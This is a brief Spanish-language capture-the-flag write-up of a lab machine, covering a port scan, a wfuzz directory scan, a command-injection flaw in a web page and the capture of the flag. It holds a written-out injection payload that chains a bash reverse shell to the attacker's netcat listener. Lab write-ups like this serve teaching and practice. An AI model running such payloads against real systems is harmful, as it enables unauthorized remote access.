Realizamos un escaneo y encontramos el puerto 80 abierto
![[Pasted image 20240619105629.png]]

Analizamos la web con Wfuzz pero no nos encuentra nada interesante
```Bash
wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.31.61/FUZZ
```
![[Pasted image 20240619110817.png]]

Entramos en la web y nos encontramos lo siguiente
![[Pasted image 20240619105658.png]]

Probando comandos detectamos que es vulnerable a añadir comandos
![[Pasted image 20240619112749.png]]

Ahora nos ponemos a la escucha con netcat y ejecutamos la reverse shell
```Bash
ls;bash -c 'exec bash -i &>/dev/tcp/10.9.0.164/1234 <&1'
```
![[Pasted image 20240619112949.png]]

Y ya tendremos acceso a la maquina victima
![[Pasted image 20240619113015.png]]

Y aqui tenemos la flag
![[Pasted image 20240619113145.png]]

